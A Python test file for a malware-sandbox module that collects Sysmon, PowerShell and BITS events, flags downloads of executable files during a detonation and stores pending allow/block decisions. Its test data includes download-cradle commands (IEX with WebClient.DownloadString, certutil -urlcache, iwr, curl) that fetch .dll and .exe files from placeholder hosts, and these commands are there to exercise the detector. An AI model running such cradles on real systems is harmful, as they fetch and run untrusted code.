"""Store, collector, pending decisions and the download finding (webui/firewall_store.py).

Everything runs on fakes: the readers are lambdas and the files live in tmp_path, so the
module is tested without Windows.
"""

import json
import os
import time
from datetime import datetime, timezone

import pytest

import firewall
import firewall_store
from firewall_store import (EXECUTABLE_SUFFIXES, FirewallCollector, FirewallStore, PendingStore, Settings,
                            download_findings, urls_in)

BASE = datetime(2026, 11, 14, 10, 0, 0, tzinfo=timezone.utc).timestamp()
IMAGE = r"C:\x\a.exe"
TDC_PYTHON = r"C:\DetonationChamberUI\venv\Scripts\python.exe"


def iso(t):
    """ISO text of ``t`` seconds after BASE."""
    return datetime.fromtimestamp(BASE + t, timezone.utc).isoformat()


def conn(t=0, dst="1.2.3.4", dport=443, pid=4812, image=IMAGE):
    return {"timestamp": iso(t), "event_id": 3, "pid": str(pid), "image": image, "type": "NetworkConnect",
          "dst_ip": dst, "dst_port": str(dport), "dst_hostname": "-", "protocol": "tcp",
          "src_ip": "10.0.2.15", "src_port": str(51000 + t)}


def proc(pid, parent=None, t=0, cmd="", image=IMAGE):
    return {"timestamp": iso(t), "event_id": 1, "pid": str(pid), "image": image, "commandline": cmd,
          "parent_pid": str(parent) if parent is not None else "-", "parent_image": r"C:\x\parent.exe"}


def dns_ev(name, ip, t=0):
    return {"timestamp": iso(t), "event_id": 22, "pid": "4812", "image": IMAGE, "query": name, "result": ip,
          "status": "0"}


def ps(text, pid=4812, t=0, record_id=None):
    """A PowerShell event the way log_store.parse_powershell_events yields it."""
    return {"time": iso(t), "source": "powershell", "message": text,
            "fields": {"event_id": 4104, "record_id": record_id, "pid": pid}}


def bits(url, pid=4812, t=0, record_id=None):
    ev = {"timestamp": iso(t), "event_id": 59, "data": {"url": url, "name": "job"}}
    if pid is not None:
        ev["pid"] = pid
    if record_id is not None:
        ev["record_id"] = record_id
    return ev


def flow(host="a.b", ip="1.2.3.4", port=80, pid=4812, image=IMAGE, last=BASE):
    return {"image": image, "pid": pid, "protocol": "tcp", "src_ip": "10.0.2.15", "dst_ip": ip, "dst_port": port,
            "dst_hostname": host, "count": 1, "first_seen": last, "last_seen": last, "times": [last]}


FLOWS = [flow(port=80), flow(port=443)]

FINDING = {"id": "dl-1", "pid": 4812, "image": IMAGE, "url": "http://a.b/c.dll", "dst_ip": "1.2.3.4",
           "dst_port": 80, "source": "powershell", "observed_at": "2026-11-14T10:00:00.000Z", "origin_pid": 4812}
FINDING2 = dict(FINDING, id="dl-2", url="http://a.b/d.exe")


@pytest.fixture
def pending_path(tmp_path):
    return str(tmp_path / "pending.json")


# ---- the store -----------------------------------------------------------------------------


def test_ring_drops_the_oldest_and_honours_the_window():
    s = FirewallStore(max_connections=3)
    for t in range(5):
        s.add_connections([conn(t=t, dst=f"1.2.3.{t}")])
    assert len(s.connections()) == 3
    assert s.connections(since=iso(3))[0]["dst_ip"] == "1.2.3.3"


def test_the_window_has_both_bounds_and_takes_iso_or_epoch():
    s = FirewallStore()
    s.add_connections([conn(t=t, dst=f"1.2.3.{t}") for t in range(5)])
    assert [f["dst_ip"] for f in s.connections(since=iso(1), until=iso(3))] == ["1.2.3.1", "1.2.3.2", "1.2.3.3"]
    assert len(s.connections(since=BASE + 4)) == 1
    with pytest.raises(ValueError):
        s.connections(since="yesterday")


def test_an_empty_store_answers_with_empty_things():
    s = FirewallStore()
    assert s.connections() == [] and s.events() == [] and s.raw_for(IMAGE, "1.2.3.4", 443) == []
    assert s.dns() == {} and s.processes() == {}
    stats = s.stats()
    assert stats["counts"]["connections"] == 0 and stats["oldest"] is None and stats["newest"] is None


def test_raw_for_keeps_single_connections_for_beaconing():
    s = FirewallStore()
    s.add_connections([conn(t=t, dst="1.2.3.4", dport=443) for t in (0, 60, 120)])
    s.add_connections([conn(t=30, dst="5.6.7.8", dport=443), conn(t=31, dst="1.2.3.4", dport=80)])
    got = s.raw_for(IMAGE, "1.2.3.4", 443)
    assert len(got) == 3
    assert got == [(BASE, "1.2.3.4", 443), (BASE + 60, "1.2.3.4", 443), (BASE + 120, "1.2.3.4", 443)]
    assert len(s.raw_for(IMAGE.upper(), "1.2.3.4", 443)) == 3          # Windows paths do not care for case


def test_the_store_keeps_connections_only_and_skips_what_it_cannot_place():
    s = FirewallStore()
    n = s.add_connections([conn(), dns_ev("a.b", "1.2.3.4"), {"event_id": 3, "timestamp": "nonsense"},
                           {"error": "boom"}, dict(conn(), error="x")])
    assert n == 1 and len(s.events()) == 1


def test_the_ring_forgets_what_is_older_than_a_week_before_its_newest_entry():
    s = FirewallStore()
    s.add_connections([conn(t=0, dst="1.1.1.1")])
    s.add_connections([conn(t=firewall_store.RETAIN_S + 5, dst="2.2.2.2")])
    assert [f["dst_ip"] for f in s.connections()] == ["2.2.2.2"]


def test_dns_map_takes_the_newest_answer_and_survives_more_events():
    s = FirewallStore()
    s.add_dns([dns_ev("old.example", "1.2.3.4", t=0), dns_ev("a.b", "5.6.7.8", t=1)])
    s.add_dns([dns_ev("new.example", "1.2.3.4", t=5)])
    assert s.dns() == {"5.6.7.8": "a.b", "1.2.3.4": "new.example"}


def test_processes_know_start_parent_and_a_reused_pid_is_the_newest():
    s = FirewallStore()
    s.add_processes([proc(10, parent=1, t=0, cmd="a"), proc(11, parent=10, t=5, cmd="b")])
    s.add_processes([proc(10, parent=2, t=9, cmd="c")])
    got = s.processes()
    assert got[11]["parent_pid"] == 10 and got[11]["start"] == BASE + 5
    assert got[10]["parent_pid"] == 2 and got[10]["commandline"] == "c" and got[10]["image"] == IMAGE
    assert len(s.process_events()) == 3
    assert proc(12)["parent_pid"] == "-" and s.add_processes([proc(12)]) == 1
    assert s.processes()[12]["parent_pid"] is None


def test_a_huge_commandline_is_cut_and_a_huge_script_is_cut_but_found():
    s = FirewallStore()
    s.add_processes([proc(10, cmd="x" * 100000)])
    assert len(s.process_events()[0]["commandline"]) == firewall_store.MAX_COMMANDLINE_CHARS
    s.add_powershell([ps("noise\n" * 100000 + "http://a.b/c.dll")])           # no URL within the kept text
    s.add_powershell([ps("http://a.b/c.dll " + "x" * 200000)])
    assert len(s.powershell()) == 2
    assert all(len(e["message"]) <= firewall_store.MAX_SCRIPT_CHARS for e in s.powershell())


def test_powershell_and_bits_are_kept_only_with_a_url():
    s = FirewallStore()
    assert s.add_powershell([ps("Get-Date"), ps("iwr http://a.b/c.dll")]) == 1
    assert s.add_bits([bits("http://a.b/s.exe"), bits("not a url"), {"event_id": 59}]) == 1
    assert len(s.powershell()) == 1 and len(s.bits()) == 1


def test_firewall_events_are_kept_for_classify():
    s = FirewallStore()
    ev = {"time": iso(0), "source": "firewall", "message": "DROP", "fields": {"action": "DROP", "dst_ip": "1.2.3.4"}}
    assert s.add_firewall([ev, {"time": "junk"}]) == 1
    assert s.firewall_events(since=iso(0)) == [ev] and s.firewall_events(since=iso(1)) == []


def test_classify_runs_on_what_the_store_returns():
    s = FirewallStore()
    s.add_connections([conn(t=0), conn(t=1)])
    flows = firewall.classify(s.events(), s.firewall_events(), firewall.Context(dns=s.dns(), processes=s.processes()))
    assert len(flows) == 1 and flows[0]["count"] == 2


# ---- URLs ----------------------------------------------------------------------------------


def test_urls_in_finds_cradles_and_ignores_the_rest():
    assert urls_in("IEX(New-Object Net.WebClient).DownloadString('http://a.b/c.dll')") == ["http://a.b/c.dll"]
    assert urls_in("certutil -urlcache -f https://x.y/z.exe out.exe") == ["https://x.y/z.exe"]
    assert urls_in("no url here") == []
    assert urls_in("http://" + "a" * 5000) == []          # length guard


def test_urls_in_trims_punctuation_dedupes_and_caps_the_count():
    assert urls_in('see "HTTP://A.B/c.EXE". And http://a.b/x, http://a.b/x') == ["HTTP://A.B/c.EXE", "http://a.b/x"]
    assert urls_in("http:// and https://. and ftp://a.b/c.exe") == []
    many = " ".join(f"http://a.b/{i}.exe" for i in range(50))
    assert urls_in(many) == [f"http://a.b/{i}.exe" for i in range(20)]
    assert urls_in(None) == [] and urls_in("") == []


def test_urls_in_drops_the_long_one_and_keeps_the_others():
    assert urls_in("http://" + "a" * 3000 + " http://a.b/c.dll") == ["http://a.b/c.dll"]
    assert len(urls_in("http://" + "a" * 2041)[0]) == 2048           # right at the limit


def test_urls_in_is_linear_on_a_big_text():
    start = time.time()
    assert urls_in("http://a" * 1_000_000 + " ") == []                # one 8 MB token
    assert urls_in("x " * 5_000_000 + "http://a.b/c.dll") == ["http://a.b/c.dll"]
    assert time.time() - start < 5


# ---- the download finding ------------------------------------------------------------------


def test_download_finding_only_for_executables_in_a_detonation():
    f = download_findings([ps("… 'http://a.b/c.dll'", pid=4812)], [], [], FLOWS, {4812})
    assert f[0]["url"] == "http://a.b/c.dll" and f[0]["pid"] == 4812
    assert download_findings([ps("… 'http://a.b/page.html'", pid=4812)], [], [], FLOWS, {4812}) == []
    assert download_findings([ps("… 'http://a.b/c.dll'", pid=99)], [], [], FLOWS, set()) == []


def test_a_finding_carries_what_task_five_builds_its_keys_from():
    f = download_findings([ps("iwr http://a.b/c.dll", pid=4812, t=7)], [], [], FLOWS, {4812})[0]
    assert (f["pid"], f["image"], f["dst_ip"], f["dst_port"], f["source"]) == (4812, IMAGE, "1.2.3.4", 80, "powershell")
    assert f["observed_at"] == "2026-11-14T10:00:07.000Z" and f["origin_pid"] == 4812 and f["id"]
    assert f["in_detonation"] is True and f["self"] is False and f["requested_by"] is None
    ctx = firewall.Context(downloads={(f["pid"], f["dst_ip"], f["dst_port"])})
    tagged = firewall.classify([conn(t=0, dst="1.2.3.4", dport=80)], [], ctx)
    assert "download" in tagged[0]["tags"]


def test_the_same_download_is_the_same_finding():
    events = [ps("iwr http://a.b/c.dll", t=1)]
    assert download_findings(events, [], [], FLOWS, {4812})[0]["id"] == \
        download_findings(events * 2, [], [], FLOWS, {4812})[0]["id"]
    assert len(download_findings(events * 2, [], [], FLOWS, {4812})) == 1
    other = download_findings([ps("iwr http://a.b/d.dll")], [], [], FLOWS, {4812})
    assert other[0]["id"] != download_findings(events, [], [], FLOWS, {4812})[0]["id"]


def test_the_extension_is_read_from_the_path_in_any_case():
    def urls(*found):
        return download_findings([ps(" ".join(found))], [], [], FLOWS, {4812})
    assert len(urls("http://a.b/LOADER.EXE")) == 1
    assert len(urls("http://a.b/dir/c%2Edll")) == 1
    assert len(urls("http://a.b/c.dll;v=1")) == 1
    assert urls("http://a.b/payload") == [] and urls("http://a.b/") == [] and urls("http://a.b") == []
    assert urls("http://a.b/get?file=x.exe") == []
    assert urls("http://a.b/x.exe.txt") == []
    assert all(s.startswith(".") and s == s.lower() for s in EXECUTABLE_SUFFIXES)
    assert {".exe", ".dll", ".ps1", ".lnk", ".ocx"} <= EXECUTABLE_SUFFIXES


def test_bits_url_becomes_a_finding():
    f = download_findings([], [], [bits(url="http://a.b/s.exe", pid=4812)], FLOWS, {4812})
    assert f[0]["source"] == "bits"


SVCHOST = r"C:\Windows\System32\svchost.exe"


def test_a_bits_job_is_fetched_by_the_bits_service_and_says_so():
    svchost = flow(pid=900, image=SVCHOST, ip="9.9.9.9", port=80)
    f = download_findings([], [], [bits("http://a.b/s.exe", pid=None, t=5)], [svchost], {4812})[0]
    assert (f["pid"], f["image"], f["dst_ip"], f["origin_pid"]) == (900, SVCHOST, "9.9.9.9", None)
    assert f["requested_by"] == "bits" and f["source"] == "bits"
    other = download_findings([ps("iwr http://a.b/c.dll")], [], [], FLOWS, {4812})[0]
    assert other["requested_by"] is None


def test_a_bits_job_is_in_a_detonation_by_the_window_not_by_the_pid():
    svchost = flow(pid=900, image=SVCHOST, ip="9.9.9.9", port=80)
    started = [proc(4812, parent=1, t=0)]

    def job(t, submissions, procs=started, pid=None):
        return download_findings([], procs, [bits("http://a.b/s.exe", pid=pid, t=t)], [svchost], submissions)[0]
    assert job(5, {4812})["in_detonation"] is True            # nobody names the requester; a submission was running
    assert job(5, {4812}, pid=900)["in_detonation"] is True    # the BITS service's own pid is no submission either
    assert job(-10, {4812})["in_detonation"] is False          # the job is older than the submission
    assert job(5, set())["in_detonation"] is False             # no submission in a window
    assert job(5, {4812}, procs=[])["in_detonation"] is True   # a submission whose start the ring has lost
    assert job(5, {4812}, procs=[proc(4812, t=50)])["in_detonation"] is False
    undated = dict(bits("http://a.b/s.exe", pid=None), timestamp="junk")
    assert download_findings([], started, [undated], [svchost], {4812})[0]["in_detonation"] is False


def test_sysmon_commandline_is_a_source_and_an_ancestor_counts():
    certutil = proc(5000, parent=4812, cmd="certutil -urlcache -f http://a.b/z.exe out.exe", t=3)
    f = download_findings([], [proc(4812), certutil], [], [flow(pid=5000, image=r"C:\Windows\certutil.exe")], {4812})
    assert f[0]["source"] == "sysmon" and f[0]["pid"] == 5000 and f[0]["image"] == r"C:\Windows\certutil.exe"
    grandchild = proc(6000, parent=5000, cmd="curl http://a.b/z.exe")
    f = download_findings([], [proc(4812), certutil, grandchild], [], [flow(pid=6000)], {4812})
    assert f[0]["pid"] == 6000 and f[0]["in_detonation"] is True
    elsewhere = download_findings([], [certutil], [], [flow(pid=5000)], {1234})
    assert [x["in_detonation"] for x in elsewhere] == [False]


def test_a_url_without_a_connection_to_it_is_no_finding_yet():
    assert download_findings([ps("iwr http://a.b/c.dll")], [], [], [], {4812}) == []
    assert download_findings([ps("iwr http://a.b/c.dll")], [], [], [flow(host="other.example")], {4812}) == []
    assert download_findings([ps("iwr http://a.b/c.dll")], [], [], [flow(pid=77)], {4812}) == []


def test_a_url_with_an_address_is_matched_by_the_address_and_the_port_is_preferred():
    f = download_findings([ps("iwr http://1.2.3.4:8080/c.dll")], [], [],
                          [flow(host=None, ip="1.2.3.4", port=443), flow(host=None, ip="1.2.3.4", port=8080)], {4812})
    assert f[0]["dst_port"] == 8080
    f = download_findings([ps("iwr https://a.b/c.dll")], [], [], FLOWS, {4812})
    assert f[0]["dst_port"] == 443
    assert download_findings([ps("iwr http://[::1/c.dll")], [], [], FLOWS, {4812}) == []


def test_every_finding_is_returned_and_says_whether_it_is_in_a_detonation():
    events = [ps("iwr http://a.b/c.dll", pid=99)]
    f = download_findings(events, [], [], [flow(pid=99)], set())
    assert [(x["pid"], x["in_detonation"]) for x in f] == [(99, False)]
    assert download_findings(events, [], [], [flow(pid=99)], {99})[0]["in_detonation"] is True
    child = [proc(99, parent=50), proc(50, parent=4812)]
    assert download_findings(events, child, [], [flow(pid=99)], {4812})[0]["in_detonation"] is True
    assert download_findings(events, child, [], [flow(pid=99)], {77})[0]["in_detonation"] is False


def test_the_ask_policy_is_not_this_modules_business():
    with pytest.raises(TypeError):
        download_findings([], [], [], [], set(), "all")
    with pytest.raises(TypeError):
        download_findings([], [], [], [], set(), ask_mode="off")


def test_a_finding_marks_tdc_own_processes_instead_of_dropping_them():
    events = [ps("iwr http://a.b/c.dll", pid=99)]
    assert download_findings(events, [], [], [flow(pid=99, image=TDC_PYTHON)], {99})[0]["self"] is True
    git = flow(pid=99, image=r"C:\Program Files\Git\cmd\git.exe")
    assert download_findings(events, [], [], [git], set())[0]["self"] is True
    assert download_findings(events, [], [], [flow(pid=99)], set())[0]["self"] is False


def test_findings_come_oldest_first():
    events = [ps("iwr http://a.b/late.dll", t=9), ps("iwr http://a.b/early.dll", t=2)]
    assert [f["url"] for f in download_findings(events, [], [], FLOWS, {4812})] == \
        ["http://a.b/early.dll", "http://a.b/late.dll"]


def test_garbage_in_the_event_lists_does_not_raise():
    junk = [None, 5, {}, {"message": None}, {"message": 3}, {"commandline": "x", "event_id": 1}, {"data": "str"}]
    assert download_findings(junk, junk, junk, FLOWS, {4812}) == []


# ---- pending decisions ---------------------------------------------------------------------


def test_pending_resolve_is_idempotent(tmp_path):
    p = PendingStore(str(tmp_path / "pending.json"))
    item = p.add(FINDING, deadline=time.time() + 30)
    first = p.resolve(item["id"], "allow")
    second = p.resolve(item["id"], "block_fetch")
    assert second["action"] == "allow" and second == first
    assert p.open() == []


def test_settle_tells_the_winner_from_the_late_answer(pending_path):
    p = PendingStore(pending_path)
    item = p.add(FINDING, deadline=time.time() + 30)
    first, won = p.settle(item["id"], "block_fetch", {"by": "user"})
    late, lost = p.settle(item["id"], "allow")
    assert won is True and lost is False
    assert first["action"] == "block_fetch" and late == first and late["result"] == {"by": "user"}


def test_resolve_refuses_what_it_does_not_know(pending_path):
    p = PendingStore(pending_path)
    item = p.add(FINDING, deadline=time.time() + 30)
    with pytest.raises(KeyError):
        p.resolve("nope", "allow")
    with pytest.raises(ValueError):
        p.resolve(item["id"], "format_disk")
    assert len(p.open()) == 1


def test_pending_survives_a_restart(tmp_path):
    path = str(tmp_path / "pending.json")
    item = PendingStore(path).add(FINDING, deadline=time.time() + 30)
    assert PendingStore(path).open()[0]["id"] == item["id"]


def test_a_decision_taken_survives_a_restart_too(pending_path):
    p = PendingStore(pending_path)
    item = p.add(FINDING, deadline=time.time() + 30)
    p.resolve(item["id"], "allow", {"by": "user"})
    again = PendingStore(pending_path)
    assert again.open() == [] and again.history()[0]["action"] == "allow"
    assert again.resolve(item["id"], "block")["action"] == "allow"


def test_expired_lists_only_what_ran_out(pending_path):
    p = PendingStore(pending_path)
    old = p.add(FINDING, deadline=100.0)
    p.add(FINDING2, deadline=10_000.0)
    assert [e["id"] for e in p.expired(now=200.0)] == [old["id"]]


def test_a_deadline_in_the_past_is_due_at_once_and_zero_means_now(pending_path):
    p = PendingStore(pending_path)
    now = time.time()
    item = p.add(FINDING, deadline=now - 5)
    assert [e["id"] for e in p.expired(now)] == [item["id"]]
    p.resolve(item["id"], "block_fetch", {"by": "timeout"})
    assert p.expired(now) == []                                  # a decided one is not due again
    assert p.add(FINDING2, deadline=0)["id"] in [e["id"] for e in p.expired(now)]


def test_the_same_finding_is_not_asked_twice(pending_path):
    p = PendingStore(pending_path)
    first = p.add(FINDING, deadline=time.time() + 30)
    p.resolve(first["id"], "allow")
    again = p.add(FINDING, deadline=time.time() + 30)
    assert again["action"] == "allow" and len(p.open()) == 0 and len(p.history()) == 1


def test_a_finding_without_an_id_gets_one(pending_path):
    p = PendingStore(pending_path)
    a = p.add({"url": "http://a.b/c.exe"}, deadline=1)
    b = p.add({"url": "http://a.b/c.exe"}, deadline=1)
    assert a["id"] and a["id"] != b["id"] and len(p.open()) == 2


def test_items_are_copies(pending_path):
    p = PendingStore(pending_path)
    item = p.add(FINDING, deadline=time.time() + 30)
    item["finding"]["url"] = "tampered"
    p.open()[0]["deadline"] = 0
    assert p.open()[0]["finding"]["url"] == "http://a.b/c.dll" and p.expired(100.0) == []


def test_set_result_adds_what_the_fetch_found_out(pending_path):
    p = PendingStore(pending_path)
    item = p.add(FINDING, deadline=time.time() + 30)
    p.resolve(item["id"], "block_fetch", {"by": "timeout"})
    p.set_result(item["id"], {"capture_id": "c1"})
    assert PendingStore(pending_path).history()[0]["result"] == {"by": "timeout", "capture_id": "c1"}
    with pytest.raises(KeyError):
        p.set_result("nope", {})


def test_history_keeps_24_hours_newest_first(pending_path):
    now = [1_000_000.0]
    p = PendingStore(pending_path, clock=lambda: now[0])
    for n, finding in enumerate([dict(FINDING, id=f"f{i}") for i in range(3)]):
        item = p.add(finding, deadline=now[0])
        p.resolve(item["id"], "allow")
        now[0] += 10
    assert [h["id"] for h in p.history()] == ["f2", "f1", "f0"]
    assert [h["id"] for h in p.history(limit=1)] == ["f2"]
    now[0] += 24 * 3600 - 15
    assert [h["id"] for h in p.history()] == ["f2"]
    now[0] += 100
    assert p.history() == []
    assert PendingStore(pending_path, clock=lambda: now[0]).history() == []


def test_at_most_200_decisions_stay_open_and_the_oldest_goes_to_the_history(pending_path):
    p = PendingStore(pending_path)
    for i in range(205):
        p.add(dict(FINDING, id=f"f{i}"), deadline=time.time() + 30)
    assert len(p.open()) == 200 and p.open()[0]["id"] == "f5"
    dropped = [h for h in p.history(limit=500) if h["action"] == "dropped"]
    assert len(dropped) == 5 and dropped[0]["result"]["reason"]


def test_a_corrupt_pending_file_is_set_aside_and_the_store_starts_empty(tmp_path):
    path = tmp_path / "pending.json"
    path.write_text("{ not json", encoding="utf-8")
    p = PendingStore(str(path))
    assert p.open() == [] and (tmp_path / "pending.json.corrupt").exists()
    item = p.add(FINDING, deadline=time.time() + 30)
    assert PendingStore(str(path)).open()[0]["id"] == item["id"]


def test_an_older_or_odd_pending_file_is_read_as_far_as_it_goes(tmp_path):
    path = tmp_path / "pending.json"
    good = {"id": "x1", "finding": FINDING, "deadline": 50, "created_at": 40, "action": None, "result": None}
    path.write_text(json.dumps([good, {"id": "bad"}, "text", {"id": "y", "finding": {}, "deadline": "soon",
                                                              "created_at": 1}]), encoding="utf-8")
    p = PendingStore(str(path))
    assert [i["id"] for i in p.open()] == ["x1"] and p.open()[0]["resolved_at"] is None
    path.write_text(json.dumps({"version": 7, "items": "nope"}), encoding="utf-8")
    assert PendingStore(str(path)).open() == []
    path.write_text("[]", encoding="utf-8")
    assert PendingStore(str(path)).open() == []


def test_the_file_is_written_whole_and_leaves_no_temp_file(tmp_path):
    path = tmp_path / "sub" / "pending.json"
    p = PendingStore(str(path))
    p.add(FINDING, deadline=1)
    assert json.loads(path.read_text(encoding="utf-8"))["items"][0]["id"] == "dl-1"
    assert sorted(os.listdir(path.parent)) == ["pending.json"]


def test_a_write_that_fails_is_logged_and_the_decision_stands(tmp_path, monkeypatch, caplog):
    p = PendingStore(str(tmp_path / "pending.json"))
    monkeypatch.setattr(firewall_store.os, "replace", lambda *a: (_ for _ in ()).throw(OSError("disk full")))
    item = p.add(FINDING, deadline=1)
    assert p.resolve(item["id"], "allow")["action"] == "allow" and "not saved" in caplog.text
    assert sorted(os.listdir(tmp_path)) == []


def test_two_answers_at_once_act_once(pending_path):
    import threading
    p = PendingStore(pending_path)
    item = p.add(FINDING, deadline=time.time() + 30)
    wins = []
    threads = [threading.Thread(target=lambda a=a: wins.append(p.settle(item["id"], a)[1]))
               for a in ("allow", "block", "block_fetch", "allow") * 4]
    [t.start() for t in threads]
    [t.join() for t in threads]
    assert wins.count(True) == 1 and len(wins) == 16


# ---- settings ------------------------------------------------------------------------------


def test_settings_round_trip_and_defaults(tmp_path):
    s = Settings(str(tmp_path / "state.json"))
    assert (s.ask_mode, s.isolated) == ("detonation", False)
    s.set(ask_mode="off", isolated=True, outbound_before="Allow")
    assert Settings(str(tmp_path / "state.json")).ask_mode == "off"


def test_settings_keep_the_way_back_for_isolated(tmp_path):
    path = str(tmp_path / "state.json")
    s = Settings(path)
    assert (s.outbound_before, s.isolated_since) == (None, None)
    s.set(isolated=True, outbound_before="NotConfigured", isolated_since=1_700_000_000.5)
    again = Settings(path)
    assert (again.isolated, again.outbound_before, again.isolated_since) == (True, "NotConfigured", 1_700_000_000.5)
    assert again.as_dict() == {"ask_mode": "detonation", "isolated": True, "outbound_before": "NotConfigured",
                               "isolated_since": 1_700_000_000.5}
    again.set(isolated=False, outbound_before=None, isolated_since=None)
    assert Settings(path).as_dict() == Settings.DEFAULTS


def test_settings_refuse_wrong_values_and_change_nothing(tmp_path):
    s = Settings(str(tmp_path / "state.json"))
    for bad in ({"ask_mode": "always"}, {"isolated": "yes"}, {"isolated": 1}, {"outbound_before": 3},
                {"isolated_since": True}, {"isolated_since": float("nan")}, {"nope": 1},
                {"isolated": True, "ask_mode": "always"}):
        with pytest.raises(ValueError):
            s.set(**bad)
    assert s.as_dict() == Settings.DEFAULTS and not os.path.exists(s.path)


def test_settings_that_cannot_be_saved_raise_and_roll_back(tmp_path, monkeypatch):
    s = Settings(str(tmp_path / "state.json"))
    monkeypatch.setattr(firewall_store.os, "replace", lambda *a: (_ for _ in ()).throw(OSError("read-only")))
    with pytest.raises(OSError):
        s.set(isolated=True, outbound_before="Allow")
    assert (s.isolated, s.outbound_before) == (False, None)


def test_a_corrupt_or_odd_settings_file_gives_defaults_and_says_why(tmp_path):
    path = tmp_path / "state.json"
    path.write_text("{ nope", encoding="utf-8")
    s = Settings(str(path))
    assert s.as_dict() == Settings.DEFAULTS and s.load_error
    path.write_text(json.dumps({"ask_mode": "always", "isolated": True, "extra": 1}), encoding="utf-8")
    s = Settings(str(path))
    assert (s.ask_mode, s.isolated) == ("detonation", True) and "ask_mode" in s.load_error
    assert Settings(str(tmp_path / "none.json")).load_error is None


# ---- the collector -------------------------------------------------------------------------


class Clock:
    def __init__(self, t=BASE + 100):
        self.t = t

    def __call__(self):
        return self.t


def readers(**over):
    base = {name: (lambda **k: []) for name in firewall_store.SOURCES}
    base.update(over)
    return base


def collector(tmp_path, rs=None, window=False, clock=None):
    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
    return store, FirewallCollector(store, settings, rs or readers(), lambda: window, now=clock or Clock())


def test_collector_ticks_fast_only_in_the_detonation_window(tmp_path):
    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
    c = FirewallCollector(store, settings, readers(), fast_window=lambda: True)
    assert c.interval() == 1.0
    c2 = FirewallCollector(store, settings, readers(), fast_window=lambda: False)
    assert c2.interval() == 10.0
    c3 = FirewallCollector(store, settings, readers(), fast_window=lambda: 1 / 0)
    assert c3.interval() == 10.0 and c3.tick() is not None          # a broken window test is "no window"


def test_a_failing_reader_does_not_stop_the_tick(tmp_path):
    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
    calls = []

    def boom(**k):
        raise RuntimeError("wevtutil failed\nsecond line")

    rs = {"connections": boom, "dns": lambda **k: calls.append("dns") or [],
          "processes": lambda **k: [], "powershell": lambda **k: [],
          "firewall": lambda **k: [], "bits": lambda **k: []}
    FirewallCollector(store, settings, rs, lambda: False).tick()
    assert calls == ["dns"]
    assert store.stats()["status"]["connections"] == "unavailable"
    assert store.stats()["hints"]["connections"] == "wevtutil failed"
    assert store.stats()["status"]["dns"] == "ok"


def sysmon_reader(batches, asked):
    """A Sysmon reader the way log_store.Collector asks: ``(event_ids, since_iso)``."""
    batches = iter(batches)

    def read(event_ids, since_iso):
        asked.append((list(event_ids), firewall.epoch_of(since_iso)))
        batch = next(batches)
        if isinstance(batch, Exception):
            raise batch
        return batch
    return read


def test_the_sysmon_readers_are_asked_by_time_with_an_overlap_of_five_seconds(tmp_path):
    asked = []
    read = sysmon_reader([[conn(t=10), conn(t=20)], [conn(t=30)], []], asked)
    store, c = collector(tmp_path, readers(connections=read))
    assert [c.tick()["connections"] for _ in range(3)] == [2, 1, 0]
    assert asked == [([3], BASE + 100 - 86400), ([3], BASE + 15), ([3], BASE + 25)]
    assert len(store.events()) == 3


def test_each_sysmon_source_asks_for_its_own_event_and_keeps_its_own_position(tmp_path):
    asked = {"connections": [], "dns": [], "processes": []}
    rs = readers(connections=sysmon_reader([[conn(t=50)], []], asked["connections"]),
                 dns=sysmon_reader([[], []], asked["dns"]),
                 processes=sysmon_reader([[proc(4812, t=40)], []], asked["processes"]))
    store, c = collector(tmp_path, rs)
    c.tick()
    c.tick()
    assert [a[0] for a in asked["connections"]] == [[3], [3]] and asked["dns"][0][0] == [22]
    assert asked["processes"][0][0] == [1]
    assert (asked["connections"][1][1], asked["processes"][1][1], asked["dns"][1][1]) == \
        (BASE + 45, BASE + 35, BASE + 100 - 86400)       # nothing seen yet: nothing to move on from


def test_an_overlapping_reread_adds_nothing_twice(tmp_path):
    first = [conn(t=10), conn(t=20)]
    rs = readers(connections=sysmon_reader([first, first + [conn(t=21)]], []),
                 dns=sysmon_reader([[dns_ev("a.b", "1.2.3.4", t=1)], [dns_ev("a.b", "1.2.3.4", t=1)]], []),
                 processes=sysmon_reader([[proc(10, t=1)], [proc(10, t=1), proc(11, parent=10, t=2)]], []))
    store, c = collector(tmp_path, rs)
    assert c.tick() == {"connections": 2, "dns": 1, "processes": 1, "powershell": 0, "firewall": 0}
    assert c.tick() == {"connections": 1, "dns": 0, "processes": 1, "powershell": 0, "firewall": 0}
    assert len(store.events()) == 3 and len(store.process_events()) == 2 and store.dns() == {"1.2.3.4": "a.b"}


def test_a_reread_answer_does_not_overwrite_a_newer_one(tmp_path):
    old, new = dns_ev("old.example", "1.2.3.4", t=1), dns_ev("new.example", "1.2.3.4", t=9)
    store, c = collector(tmp_path, readers(dns=sysmon_reader([[old, new], [old]], [])))
    c.tick()
    c.tick()
    assert store.dns() == {"1.2.3.4": "new.example"}


def test_the_dedup_memory_is_bounded(tmp_path):
    store = FirewallStore()
    n = firewall_store.MAX_DEDUP_KEYS + 10
    store.add_connections([dict(conn(t=0), src_port=str(i)) for i in range(n)])
    assert len(store._seen["connections"]) == firewall_store.MAX_DEDUP_KEYS


def test_a_full_page_inside_the_overlap_moves_the_position_on(tmp_path):
    asked = []
    page = [dict(conn(t=100), src_port=str(i)) for i in range(firewall_store.SYSMON_PAGE)]
    read = sysmon_reader([[conn(t=100)], page, []], asked)
    store, c = collector(tmp_path, readers(connections=read), clock=Clock(BASE + 200))
    for _ in range(3):
        c.tick()
    assert [a[1] for a in asked[1:]] == [BASE + 95, BASE + 100]     # a page that full would be read again otherwise


def test_the_position_never_runs_backwards_nor_into_the_future(tmp_path):
    asked = []
    read = sysmon_reader([[conn(t=5000)], [conn(t=3)], [conn(t=60)], []], asked)
    store, c = collector(tmp_path, readers(connections=read), clock=Clock(BASE + 100))
    for _ in range(4):
        c.tick()
    # a clock-skewed event does not take the position beyond now; an old one does not take it back
    assert [a[1] for a in asked] == [BASE + 100 - 86400, BASE + 95, BASE + 95, BASE + 95]


def test_a_failed_read_leaves_the_position_and_a_cleared_log_is_read_on(tmp_path):
    asked = []
    read = sysmon_reader([[conn(t=10)], RuntimeError("access denied"), [], [conn(t=40)]], asked)
    store, c = collector(tmp_path, readers(connections=read))
    for _ in range(4):
        c.tick()
    assert [a[1] for a in asked] == [BASE + 100 - 86400, BASE + 5, BASE + 5, BASE + 5]
    assert len(store.events()) == 2 and store.stats()["status"]["connections"] == "ok"


